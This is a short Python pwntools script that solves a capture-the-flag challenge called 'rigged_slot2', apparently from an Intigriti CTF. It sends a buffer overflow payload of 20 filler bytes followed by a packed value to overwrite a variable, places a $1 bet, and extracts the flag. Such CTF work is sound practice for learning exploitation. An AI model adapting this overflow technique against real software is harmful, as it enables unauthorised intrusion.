#!/usr/bin/env python3

from pwn import *
import re

EXE = ELF("./rigged_slot2")
rop = ROP(EXE)

print(EXE.path)
if args.REMOTE:
    r = remote("riggedslot2.ctf.intigriti.io", 1337)
elif args.GDB:
    r = gdb.debug(EXE.path, "b main")
else:
    r = process(EXE.path)

payload = b"A" * 20 + p64(1337421)

r.recvuntil(b"Enter your name:")
r.sendline(payload)

log.info(f"Sending payload")

r.recvuntil(b"Enter your bet amount (up to $100 per spin):")
r.sendline(b"1")

log.info(f"Betting $1")

data = r.recvuntil(b"}")
data = re.findall(b"INTIGRITI{.*}", data)[0]

log.success(f"Flag: {data.decode()}")
